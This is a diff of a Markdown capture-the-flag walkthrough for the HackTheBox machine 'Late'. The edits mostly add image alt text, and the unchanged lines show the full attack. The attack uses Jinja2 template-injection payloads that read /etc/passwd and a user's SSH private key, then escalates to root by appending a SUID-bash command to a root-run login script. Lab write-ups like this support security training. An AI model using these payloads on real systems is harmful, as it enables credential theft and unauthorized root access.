@@ -1,4 +1,4 @@
-# HTB - Late
+﻿# HTB - Late
 
 **IP Address:** `10.10.11.156`  
 **OS:** Linux  
@@ -38,7 +38,7 @@ To verify if the host is reachable, we send a single ICMP packet:
 ping -c 1 10.10.11.156
 ```
 
-![](screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The host responds, confirming it is alive.
 
@@ -58,7 +58,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.156 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![](screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract the open ports:
 
@@ -66,7 +66,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![](screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -81,13 +81,8 @@ nmap -p22,80 -sC -sV 10.10.11.156 -oN targeted
 - `-sV`: Detect service versions  
 - `-oN`: Output in human-readable format  
 
-Let's check the result:
 
-```bash
-cat targeted -l java
-```
-
-![](screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**
 
@@ -107,7 +102,7 @@ At this stage we confirm the target is a **Linux machine running a Flask web app
 whatweb http://10.10.11.156
 ```
 
-![](screenshots/whatweb.png)
+![whatweb](screenshots/whatweb.png)
 
 The scan indicates a **Flask/Jinja2 stack**.
 
@@ -117,13 +112,13 @@ The scan indicates a **Flask/Jinja2 stack**.
 During browsing, we find a reference to **image.late.htb**.  
 After adding it to `/etc/hosts`, we can access the application:
 
-![](screenshots/web.png)
+![web](screenshots/web.png)
 
 The vhost provides **OCR functionality** (uploading an image generates a `results.txt` file).
 
-![](screenshots/imagen_example.png)
+![imagen_example](screenshots/imagen_example.png)
 
-![](screenshots/resukt_example.png)
+![resukt_example](screenshots/resukt_example.png)
 
 ---
 ## 3. Exploitation
@@ -132,11 +127,11 @@ The vhost provides **OCR functionality** (uploading an image generates a `result
 
 We test for SSTI by uploading an image containing `{{7*7}}`:
 
-![](screenshots/image_49.png)
+![image_49](screenshots/image_49.png)
 
 Result:
 
-![](screenshots/result_49.png)
+![result_49](screenshots/result_49.png)
 
 The output returns `49`, confirming **SSTI in Jinja2**.
 
@@ -149,7 +144,7 @@ We exploit SSTI to read system files:
 {{get_flashed_message.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
 
-![](screenshots/etc_passwd.png)
+![etc_passwd](screenshots/etc_passwd.png)
 
 Filter valid shells:
 
@@ -157,7 +152,7 @@ Filter valid shells:
 cat etc_passwd.txt | grep "sh$"
 ```
 
-![](screenshots/etc_passwd_sh.png)
+![etc_passwd_sh](screenshots/etc_passwd_sh.png)
 
 Users identified:
 - `root`
@@ -172,15 +167,15 @@ We attempt to read the user’s private key:
 {{ get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read() }}
 ```
 
-![](screenshots/image_id_rsa.png)
+![image_id_rsa](screenshots/image_id_rsa.png)
 
 Result file:
 
-![](screenshots/id_rsa.png)
+![id_rsa](screenshots/id_rsa.png)
 
 We clean the key to ensure a valid PEM format:
 
-![](screenshots/id_rsa_clean.png)
+![id_rsa_clean](screenshots/id_rsa_clean.png)
 
 ---
 ## 4. Foothold
@@ -191,7 +186,7 @@ Using the extracted key, we log in via SSH:
 ssh -i id_rsa svc_acc@10.10.11.156
 ```
 
-![](screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 ✅ **User flag obtained**
 
@@ -206,7 +201,7 @@ We search for files owned by `svc_acc` outside common directories:
 find / -user svc_acc 2>/dev/null | grep -vE "proc|run|var|sys|home"
 ```
 
-![](screenshots/proc_svc_acc.png)
+![proc_svc_acc](screenshots/proc_svc_acc.png)
 
 We find:
 
@@ -222,7 +217,7 @@ ls -l /usr/local/sbin/ssh-alert.sh
 cat /usr/local/sbin/ssh-alert.sh
 ```
 
-![](screenshots/svc_acc_ssh_alert.png)
+![svc_acc_ssh_alert](screenshots/svc_acc_ssh_alert.png)
 
 This script is executed as **root** when someone logs in via SSH.
 
@@ -236,8 +231,8 @@ chmod +x pspy64
 ./pspy64
 ```
 
-![](screenshots/pspy.png)
-![](screenshots/pspy_running.png)
+![pspy](screenshots/pspy.png)
+![pspy_running](screenshots/pspy_running.png)
 
 When logging in again, we confirm the script is executed by **root**.
 
@@ -246,7 +241,7 @@ When logging in again, we confirm the script is executed by **root**.
 
 Attempts to edit fail:
 
-![](screenshots/ssh_alert_edit_fail.png)
+![ssh_alert_edit_fail](screenshots/ssh_alert_edit_fail.png)
 
 So we inspect attributes:
 
@@ -254,7 +249,7 @@ So we inspect attributes:
 lsattr /usr/local/sbin/ssh-alert.sh 
 ```
 
-![](screenshots/ssh_alert_priv.png)
+![ssh_alert_priv](screenshots/ssh_alert_priv.png)
 
 The file has the **append-only (`a`)** attribute.  
 We cannot overwrite it, but we can append malicious commands.
@@ -266,7 +261,7 @@ echo "chmod u+s /bin/bash" > bash.txt
 cat bash.txt >> /usr/local/sbin/ssh-alert.sh
 ```
 
-![](screenshots/ssh_alerts_command_injection.png)
+![ssh_alerts_command_injection](screenshots/ssh_alerts_command_injection.png)
 
 After logging in again, `/bin/bash` has the SUID bit set.  
 We escalate:
@@ -276,8 +271,7 @@ ls -l /bin/bash
 bash -p
 ```
 
-![](screenshots/ssh_alert_bash.png)
-![](screenshots/root_flag.png)
+![ssh_alert_bash](screenshots/ssh_alert_bash.png)
 
 🏁 **Root flag obtained**
 
